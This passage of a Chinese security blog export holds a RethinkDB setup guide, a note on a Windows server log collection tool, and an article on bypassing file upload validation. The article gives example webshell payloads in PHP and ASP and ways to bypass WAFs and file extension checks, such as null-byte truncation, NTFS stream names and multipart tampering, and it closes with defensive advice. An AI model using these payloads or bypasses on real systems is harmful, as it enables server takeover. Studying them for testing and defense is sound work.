class=\"line\">sudo apt-get install rethinkdb</div></pre></td></tr></table></figure></p>\n<p>运行rethinkdb服务：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ rethinkdb</div><div class=\"line\">info: Creating directory /home/user/rethinkdb_data</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> intracluster connections on port 29015</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> client driver connections on port 28015</div><div class=\"line\">info: Listening <span class=\"keyword\">for</span> administrative HTTP connections on port 8080</div><div class=\"line\">info: Server ready</div></pre></td></tr></table></figure></p>\n<p>其他安装方式请参考：<a href=\"https://rethinkdb.com/docs/install/ubuntu/\">https://rethinkdb.com/docs/install/ubuntu/</a></p>\n<h4 id=\"windows安装\"><a href=\"#windows安装\" class=\"headerlink\" title=\"windows安装\"></a>windows安装</h4><p>下载安装包：<br><a href=\"https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip\">https://download.rethinkdb.com/windows/rethinkdb-2.3.5.zip</a><br>运行rethinkdb程序：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">C:\\Users\\Slava\\&gt;<span class=\"built_in\">cd</span> RethinkDB</div><div class=\"line\">C:\\Users\\Slava\\RethinkDB\\&gt;</div><div class=\"line\">C:\\Users\\Slava\\RethinkDB\\&gt;rethinkdb.exe</div></pre></td></tr></table></figure></p>\n<p>注意：运行rethinkdb数据库后，默认开启8080端口，访问localhost:8080展示的web页面用来管理数据库；默认开启29015端口，用来连接客户端交互数据。<br>web管理页面：<br><img src=\"/upload_image/20170207/1.png\" alt=\"\"></p>\n<h3 id=\"Client端安装使用\"><a href=\"#Client端安装使用\" class=\"headerlink\" title=\"Client端安装使用\"></a>Client端安装使用</h3><p>Client端支持编程语言：javascript，ruby，python，java，这里以python举例。</p>\n<h4 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h4><h5 id=\"Install\"><a href=\"#Install\" class=\"headerlink\" title=\"Install\"></a>Install</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo pip install rethinkdb</div></pre></td></tr></table></figure>\n<h5 id=\"Usage\"><a href=\"#Usage\" class=\"headerlink\" title=\"Usage\"></a>Usage</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div></pre></td><td class=\"code\"><pre><div class=\"line\">import rethinkdb as r</div><div class=\"line\">class dbOperation():</div><div class=\"line\">    def __init__(self,dbname,tablename):</div><div class=\"line\">        self.conn = r.connect(host=<span class=\"string\">\"localhost\"</span>,port=29015)</div><div class=\"line\">        self.table = r.db(dbname).table(tablename)</div><div class=\"line\"></div><div class=\"line\">    def Insert(self,document):</div><div class=\"line\">        <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">        插入记录到数据库</div><div class=\"line\">        '</span><span class=\"string\">''</span></div><div class=\"line\">        <span class=\"built_in\">return</span> self.table.insert(document, conflict=<span class=\"string\">\"update\"</span>).run(self.conn)</div><div class=\"line\"></div><div class=\"line\">    def query(self,**kwargs):</div><div class=\"line\">        <span class=\"string\">''</span><span class=\"string\">'</div><div class=\"line\">        自定义查询</div><div class=\"line\">        '</span><span class=\"string\">''</span></div><div class=\"line\">        f=self.table.run(self.conn)  <span class=\"comment\">##选择网站名称为空的记录。</span></div><div class=\"line\">        content=[]</div><div class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> f:</div><div class=\"line\">            content.append(i)</div><div class=\"line\">        <span class=\"built_in\">return</span> content</div></pre></td></tr></table></figure>\n<p>详情请参考：<a href=\"https://rethinkdb.com/docs/cookbook/python/\">https://rethinkdb.com/docs/cookbook/python/</a></p>\n<h3 id=\"Data-Explorer工具\"><a href=\"#Data-Explorer工具\" class=\"headerlink\" title=\"Data Explorer工具\"></a>Data Explorer工具</h3><p>这是rethinkdb自带的一个工具，可用执行数据库语句，查询修改数据库内容。<br><img src=\"/upload_image/20170207/2.png\" alt=\"\"></p>\n<h4 id=\"常用语句\"><a href=\"#常用语句\" class=\"headerlink\" title=\"常用语句\"></a>常用语句</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">r.db(<span class=\"string\">\"\"</span>).table(<span class=\"string\">\"\"</span>).count()</div><div class=\"line\">r.db(<span class=\"string\">\"\"</span>).table(<span class=\"string\">\"\"</span>).filter(&#123;<span class=\"string\">\"\"</span>:<span class=\"string\">\"\"</span>&#125;)</div><div class=\"line\">r.table(<span class=\"string\">'movies'</span>).filter(&#123;rank: 1&#125;)</div><div class=\"line\">r.table(<span class=\"string\">'movies'</span>).without(<span class=\"string\">'id'</span>).distinct().count()   删除重复项</div><div class=\"line\">r.table(<span class=\"string\">'moviesUnique'</span>).orderBy(<span class=\"string\">'rank'</span>).limit(10)  显示前十大电影</div><div class=\"line\">r.table(<span class=\"string\">'moviesUnique'</span>).orderBy(r.desc(<span class=\"string\">'rank'</span>)).limit(10)</div></pre></td></tr></table></figure>\n<p>详情请参考：<a href=\"https://rethinkdb.com/docs/reql-data-exploration/\">https://rethinkdb.com/docs/reql-data-exploration/</a></p>\n"},{"title":"windows服务器信息收集工具","date":"2016-09-04T10:54:33.000Z","comments":1,"_content":"\n　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了*服务器信息收集工具*。\n<!-- more -->\n## 功能介绍\n\n* 收集系统日志\n* 收集系统信息\n\t1. 开机时间\n\t2. IP_MAC地址\n\t3. 用户信息\n\t4. 操作系统版本\n\t5. 进程信息\n\t6. hosts文件\n\t7. 端口信息\n* 收集中间件日志\n\t1. Apache\n\t2. IIS\n\t3. Tomcat\n\t4. JBOSS\n* 全盘搜索日志文件\n\n## 使用说明\n程序帮助：\n![](/upload_image/20160905/001.png)\n\n1.运行程序，开始收集系统信息。\n![](/upload_image/20160905/002.png)\n\n2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。\n![](/upload_image/20160905/003.png)\n\n3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。\n![](/upload_image/20160905/004.png)\n\n\n>注意：如果程序运行报错(MSVCR100.dll),请前往 [下载](https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe) VC运行库进行安装,安装完成后再次运行程序即可。\n\n\n## 工具下载\n\nwindows服务器信息收集工具 [下载地址](https://github.com/tengzhangchao/InForMation)\n\n","source":"_posts/windows服务器信息收集工具.md","raw":"---\ntitle: windows服务器信息收集工具\ndate: 2016-09-04 18:54:33\ncomments: true\ntags: 信息收集工具\ncategories: 安全工具\n---\n\n　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了*服务器信息收集工具*。\n<!-- more -->\n## 功能介绍\n\n* 收集系统日志\n* 收集系统信息\n\t1. 开机时间\n\t2. IP_MAC地址\n\t3. 用户信息\n\t4. 操作系统版本\n\t5. 进程信息\n\t6. hosts文件\n\t7. 端口信息\n* 收集中间件日志\n\t1. Apache\n\t2. IIS\n\t3. Tomcat\n\t4. JBOSS\n* 全盘搜索日志文件\n\n## 使用说明\n程序帮助：\n![](/upload_image/20160905/001.png)\n\n1.运行程序，开始收集系统信息。\n![](/upload_image/20160905/002.png)\n\n2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。\n![](/upload_image/20160905/003.png)\n\n3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。\n![](/upload_image/20160905/004.png)\n\n\n>注意：如果程序运行报错(MSVCR100.dll),请前往 [下载](https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe) VC运行库进行安装,安装完成后再次运行程序即可。\n\n\n## 工具下载\n\nwindows服务器信息收集工具 [下载地址](https://github.com/tengzhangchao/InForMation)\n\n","slug":"windows服务器信息收集工具","published":1,"updated":"2017-02-14T01:12:03.338Z","layout":"post","photos":[],"link":"","_id":"ciz80dybh00123ofvtwbxqwrt","content":"<p>　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了<em>服务器信息收集工具</em>。<br><a id=\"more\"></a></p>\n<h2 id=\"功能介绍\"><a href=\"#功能介绍\" class=\"headerlink\" title=\"功能介绍\"></a>功能介绍</h2><ul>\n<li>收集系统日志</li>\n<li>收集系统信息<ol>\n<li>开机时间</li>\n<li>IP_MAC地址</li>\n<li>用户信息</li>\n<li>操作系统版本</li>\n<li>进程信息</li>\n<li>hosts文件</li>\n<li>端口信息</li>\n</ol>\n</li>\n<li>收集中间件日志<ol>\n<li>Apache</li>\n<li>IIS</li>\n<li>Tomcat</li>\n<li>JBOSS</li>\n</ol>\n</li>\n<li>全盘搜索日志文件</li>\n</ul>\n<h2 id=\"使用说明\"><a href=\"#使用说明\" class=\"headerlink\" title=\"使用说明\"></a>使用说明</h2><p>程序帮助：<br><img src=\"/upload_image/20160905/001.png\" alt=\"\"></p>\n<p>1.运行程序，开始收集系统信息。<br><img src=\"/upload_image/20160905/002.png\" alt=\"\"></p>\n<p>2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。<br><img src=\"/upload_image/20160905/003.png\" alt=\"\"></p>\n<p>3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。<br><img src=\"/upload_image/20160905/004.png\" alt=\"\"></p>\n<blockquote>\n<p>注意：如果程序运行报错(MSVCR100.dll),请前往 <a href=\"https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe\" target=\"_blank\" rel=\"external\">下载</a> VC运行库进行安装,安装完成后再次运行程序即可。</p>\n</blockquote>\n<h2 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h2><p>windows服务器信息收集工具 <a href=\"https://github.com/tengzhangchao/InForMation\" target=\"_blank\" rel=\"external\">下载地址</a></p>\n","excerpt":"<p>　　在日常的安全服务工作中，经常会遇到需要收集目标服务器系统信息的需求，例如：系统日志，中间件日志，系统信息等。收集这些信息，有助于分析服务器安全状况，也有利于被入侵后的取证分析。然而客户网络环境往往很复杂，服务器较多，系统版本也不尽相同，给手工收集带来了很多麻烦，因此便研究开发了<em>服务器信息收集工具</em>。<br>","more":"</p>\n<h2 id=\"功能介绍\"><a href=\"#功能介绍\" class=\"headerlink\" title=\"功能介绍\"></a>功能介绍</h2><ul>\n<li>收集系统日志</li>\n<li>收集系统信息<ol>\n<li>开机时间</li>\n<li>IP_MAC地址</li>\n<li>用户信息</li>\n<li>操作系统版本</li>\n<li>进程信息</li>\n<li>hosts文件</li>\n<li>端口信息</li>\n</ol>\n</li>\n<li>收集中间件日志<ol>\n<li>Apache</li>\n<li>IIS</li>\n<li>Tomcat</li>\n<li>JBOSS</li>\n</ol>\n</li>\n<li>全盘搜索日志文件</li>\n</ul>\n<h2 id=\"使用说明\"><a href=\"#使用说明\" class=\"headerlink\" title=\"使用说明\"></a>使用说明</h2><p>程序帮助：<br><img src=\"/upload_image/20160905/001.png\" alt=\"\"></p>\n<p>1.运行程序，开始收集系统信息。<br><img src=\"/upload_image/20160905/002.png\" alt=\"\"></p>\n<p>2.程序运行期间，可以输入目标磁盘盘符，对该盘进行扫描，获取.log文件；如果不输入直接回车，默认为全盘扫描。<br><img src=\"/upload_image/20160905/003.png\" alt=\"\"></p>\n<p>3.运行完毕，会在当前目录下生成采集的日志以及系统信息文件夹。<br><img src=\"/upload_image/20160905/004.png\" alt=\"\"></p>\n<blockquote>\n<p>注意：如果程序运行报错(MSVCR100.dll),请前往 <a href=\"https://github.com/tengzhangchao/Windows_Packages/raw/master/VC%2B%2B%20Redist/2010_vcredist_x64.exe\">下载</a> VC运行库进行安装,安装完成后再次运行程序即可。</p>\n</blockquote>\n<h2 id=\"工具下载\"><a href=\"#工具下载\" class=\"headerlink\" title=\"工具下载\"></a>工具下载</h2><p>windows服务器信息收集工具 <a href=\"https://github.com/tengzhangchao/InForMation\">下载地址</a></p>"},{"title":"文件上传漏洞（绕过姿势）","date":"2016-09-22T03:02:44.000Z","_content":"\n　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）\n<!--more-->\n### 文件上传校验姿势\n* 客户端javascript校验（一般只校验后缀名）\n* 服务端校验\n\t* 文件头content-type字段校验（image/gif）\n\t* 文件内容头校验（GIF89a）\n\t* 后缀名黑名单校验\n\t* 后缀名白名单校验\n\t* 自定义正则校验\n* WAF设备校验（根据不同的WAF产品而定）\n\n#### 1.客户端校验\n　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。\n　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。\n\n#### 2.服务端校验\n##### 2.1 content-type字段校验\n　　这里以PHP代码为例，模拟web服务器端的校验代码\n```bash\n<?php\n        if($_FILES['userfile']['type'] != \"image/gif\")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。\n                {   \n                 echo \"Sorry, we only allow uploading GIF images\";\n                 exit;\n                 }\n         $uploaddir = 'uploads/';\n         $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);\n         if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))\n             {\n                 echo \"File is valid, and was successfully uploaded.\\n\";\n                } else {\n                     echo \"File uploading failed.\\n\";\n    }\n     ?>\n```\n　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。\n##### 2.2 文件头校验\n　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：\n（1）  .JPEG;.JPE;.JPG，\"JPGGraphic File\"\n（2）  .gif，\"GIF 89A\"\n（3）  .zip，\"Zip Compressed\"\n（4）  .doc;.xls;.xlt;.ppt;.apr，\"MS Compound Document v1 or Lotus Approach APRfile\"\n\n<hr>\n### 文件上传绕过校验姿势\n* 客户端绕过（抓包改包）\n* 服务端绕过\n\t* 文件类型\n\t* 文件头\n\t* 文件后缀名\n* 配合文件包含漏洞绕过\n* 配合服务器解析漏洞绕过\n* CMS、编辑器漏洞绕过\n* 配合操作系统文件命名规则绕过\n* 配合其他规则绕过\n* WAF绕过\n\n#### 1.客户端绕过\n　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。\n#### 2.服务端绕过\n##### 2.1 文件类型绕过\n　　我们可以通过抓包，将content-type字段改为image/gif\n```bash\nPOST /upload.php HTTP/1.1\nTE: deflate,gzip;q=0.3\nConnection: TE, close\nHost: localhost\nUser-Agent: libwww-perl/5.803\nContent-Type: multipart/form-data; boundary=xYzZY\nContent-Length: 155\n--xYzZY\nContent-Disposition: form-data; name=\"userfile\"; filename=\"shell.php\"\nContent-Type: image/gif (原为 Content-Type: text/plain)\n<?php system($_GET['command']);?>\n--xYzZY-\n```\n##### 2.2 文件头绕过\n　　在木马内容基础上再加了一些文件信息，有点像下面的结构\nGIF89a<?php phpinfo(); ?>\n##### 2.3 文件后缀名绕过\n前提：黑名单校验\n黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。\n绕过方法：\n（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类\n（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类\n能被解析的文件扩展名列表：\njsp  jspx  jspf\nasp  asa  cer  aspx\nphp  php  php3  php4\nexe  exee\n\n#### 3.配合文件包含漏洞\n前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。\n绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）\n（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；\n（2）然后再上传一个.php的文件，内容为<?php Include(\"上传的txt文件路径\");?>\n此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：\n```bash\n#PHP    \n<?php Include(\"上传的txt文件路径\");?> \n#ASP    \n<!--#include file=\"上传的txt文件路径\" -->\n#JSP    \n<jsp:inclde page=\"上传的txt文件路径\"/>\nor  \n<%@include file=\"上传的txt文件路径\"%>\n```\n#### 4.配合服务器解析漏洞\n详细可参考：[http://thief.one/2016/09/21/服务器解析漏洞/](http://thief.one/2016/09/21/服务器解析漏洞/)\n#### 5.配合操作系统文件命令规则\n（1）上传不符合windows文件命名规则的文件名\n　　test.asp.\n　　test.asp(空格)\n　　test.php:1.jpg\n　　test.php::$DATA\n　　shell.php::$DATA.......\n会被windows系统自动去掉不符合规则符号后面的内容。\n（2）linux下后缀名大小写\n在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。\n#### 6.CMS、编辑器漏洞\n（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。\n（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。\n这两方面的漏洞以后单独成文汇总，这里点到为止。\n#### 7.配合其他规则\n（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候\n　　test.php(0x00).jpg\n　　test.php%00.jpg\n　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg\n伪代码演示：\n```bash\nname= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)\ntype =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg\nif(type == jpg)\n   SaveFileToPath(UploadPath.name, name)   //但在这里却是以 0x00 作为文件名截断\n//最后以 help.asp 存入路径里\n```\n#### 8.WAF绕过\n##### 8.1 垃圾数据\n　　有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；\n![](/upload_image/20160922/1.png)\n当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。\n![](/upload_image/20160922/2.png)\n可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。\n##### 8.2 filename\n针对早期版本安全狗，可以多加一个filename\n![](/upload_image/20160922/3.png)\n或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：\n![](/upload_image/20160922/13.png)\n##### 8.3 POST/GET\n有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。\n此种情况可以上传一个POST型的数据包，抓包将POST改为GET。\n##### 8.4 以上方式\n针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。\n\n\n*------------------------------------------------2017.2.6更新--------------------------------------------------*\n##### 8.5 利用waf本身缺陷\n###### 删除实体里面的Conten-Type字段\n![](/upload_image/20160922/4.png)\n第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。\n```bash\n正常包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\"Content-Type: image/png\n构造包：Content-Disposition: form-data; name=\"image\"; filename=\"085733uykwusqcs8vw8wky.png\nC.php\"\n```\n###### 删除Content-Disposition字段里的空格\n![](/upload_image/20160922/5.png)\n增加一个空格导致安全狗被绕过案列：\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\n尝试在boundary后面加个空格或者其他可被正常处理的字符：\nboundary= ---------------------------47146314211411730218525550\n###### 修改Content-Disposition字段值的大小写\n![](/upload_image/20160922/6.png)\n\n###### Boundary边界不一致\n每次文件上传时的Boundary边界都是一致的：\n```bash\nContent-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099\nContent-Length: 253\n-----------------------------4714631421141173021852555099\nContent-Disposition: form-data; name=\"file1\"; filename=\"shell.asp\"\nContent-Type: application/octet-stream\n\n<%eval request(\"a\")%>\n-----------------------------4714631421141173021852555099--\n```\n但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：\nWin2k3 + IIS6.0 + ASP\n![](/upload_image/20160922/7.png)\n\n###### 文件名处回车\n![](/upload_image/20160922/8.png)\n###### 多个Content-Disposition\n在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP\n![](/upload_image/20160922/9.png)\n\n##### 利用NTFS ADS特性\nADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。\n![](/upload_image/20160922/10.png)\n\n#### 其他情况补充\n##### 文件重命名绕过\n如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。\n![](/upload_image/20160922/11.png)\n\n##### 特殊的长文件名绕过\n文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：\nshell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg\n\n##### 反删除\n将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）\n![](/upload_image/20160922/12.png)\n\n<hr>\n### 文件校验的几点建议\n* 文件扩展名服务端白名单校验。\n* 文件内容服务端校验。\n* 上传文件重命名。\n* 隐藏上传文件路径。\n\n　　以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。\n\n\n\n参考文章：\n[https://xianzhi.aliyun.com/forum/read/458.html?fpage=2](https://xianzhi.aliyun.com/forum/read/458.html?fpage=2)\n*还有一篇tools上大牛的文章，url暂时找不到了......*","source":"_posts/上传木马姿势汇总-欢迎补充.md","raw":"---\ntitle: 文件上传漏洞（绕过姿势）\ndate: 2016-09-22 11:02:44\ntags: Web应用漏洞\ncategories: 技术交流\n---\n\n　　文件上传漏洞可以说是日常渗透测试用得最多的一个漏洞，因为用它获得服务器权限最快最直接。但是想真正把这个漏洞利用好却不那么容易，其中有很多技巧，也有很多需要掌握的知识。俗话说，知己知彼方能百战不殆，因此想要研究怎么防护漏洞，就要了解怎么去利用。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。（根据个人经验总结，欢迎补充纠错~~）\n<!--more-->\n### 文件上传校验姿势\n* 客户端javascript校验（一般只校验后缀名）\n* 服务端校验\n\t* 文件头content-type字段校验（image/gif）\n\t* 文件内容头校验（GIF89a）\n\t* 后缀名黑名单校验\n\t* 后缀名白名单校验\n\t* 自定义正则校验\n* WAF设备校验（根据不同的WAF产品而定）\n\n#### 1.客户端校验\n　　一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。\n　　判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。\n\n#### 2.服务端校验\n##### 2.1 content-type字段校验\n　　这里以PHP代码为例，模拟web服务器端的校验代码\n```bash\n<?php\n        if($_FILES['userfile']['type'] != \"image/gif\")  #这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。\n                {   \n                 echo \"Sorry, we only allow uploading GIF images\";\n                 exit;\n                 }\n         $uploaddir = 'uploads/';\n         $uploadfile = $uploaddir . basename($_FILES['userfile']['name']);\n         if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile))\n             {\n                 echo \"File is valid, and was successfully uploaded.\\n\";\n                } else {\n                     echo \"File uploading failed.\\n\";\n    }\n     ?>\n```\n　　可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。\n##### 2.2 文件头校验\n　　可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：\n（1）  .JPEG;.JPE;.JPG，\"JPGGraphic File\"\n（2）  .gif，\"GIF 89A\"\n（3）  .zip，\"Zip Compressed\"\n（4）  .doc;.xls;.xlt;.ppt;.apr，\"MS Compound Document v1 or Lotus Approach APRfile\"\n\n<hr>\n### 文件上传绕过校验姿势\n* 客户端绕过（抓包改包）\n* 服务端绕过\n\t* 文件类型\n\t* 文件头\n\t* 文件后缀名\n* 配合文件包含漏洞绕过\n* 配合服务器解析漏洞绕过\n* CMS、编辑器漏洞绕过\n* 配合操作系统文件命名规则绕过\n* 配合其他规则绕过\n* WAF绕过\n\n#### 1.客户端绕过\n　　可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。\n#### 2.服务端绕过\n##### 2.1 文件类型绕过\n　　我们可以通过抓包，将content-type字段改为image/gif\n```bash\nPOST /upload.php HTTP/1.1\nTE: deflate,gzip;q=0.3\nConnection: TE, close\nHost: localhost\nUser-Agent: libwww-perl/5.803\nContent-Type: multipart/form-data; boundary=xYzZY\nContent-Length: 155\n--xYzZY\nContent-Disposition: form-data; name=\"userfile\"; filename=\"shell.php\"\nContent-Type: image/gif (原为 Content-Type: text/plain)\n<?php system($_GET['command']);?>\n--xYzZY-\n```\n##### 2.2 文件头绕过\n　　在木马内容基础上再加了一些文件信息，有点像下面的结构\nGIF89a<?php phpinfo(); ?>\n##### 2.3 文件后缀名绕过\n前提：黑名单校验\n黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。\n绕过方法：\n（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类\n（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类\n能被解析的文件扩展名列表：\njsp  jspx  jspf\nasp  asa  cer  aspx\nphp  php  php3  php4\nexe  exee\n\n#### 3.配合文件包含漏洞\n前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。\n绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）\n（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；\n（2）然后再上传一个.php的文件，内容为<?php Include(\"上传的txt文件路径\");?>\n此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：\n```bash\n#PHP    \n<?php Include(\"上传的txt文件路径\");?> \n#ASP    \n<!--#include file=\"上传的txt文件路径\" -->\n#JSP    \n<jsp:inclde page=\"上传的txt文件路径\"/>\nor  \n<%@include file=\"上传的txt文件路径\"%>\n```\n#### 4.配合服务器解析漏洞\n详细可参考：[http://thief.one/2016/09/21/服务器解析漏洞/](http://thief.one/2016/09/21/服务器解析漏洞/)\n#### 5.配合操作系统文件命令规则\n（1）上传不符合windows文件命名规则的文件名\n　　test.asp.\n　　test.asp(空格)\n　　test.php:1.jpg\n　　test.php::$DATA\n　　shell.php::$DATA.......\n会被windows系统自动去掉不符合规则符号后面的内容。\n（2）linux下后缀名大小写\n在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。\n#### 6.CMS、编辑器漏洞\n（1）CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。\n（2）编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。\n这两方面的漏洞以后单独成文汇总，这里点到为止。\n#### 7.配合其他规则\n（1）0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候\n　　test.php(0x00).jpg\n　　test.php%00.jpg\n　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg\n伪代码演示：\n```bash\nname= getname(httprequest) //假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)\ntype =gettype(name)        //而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 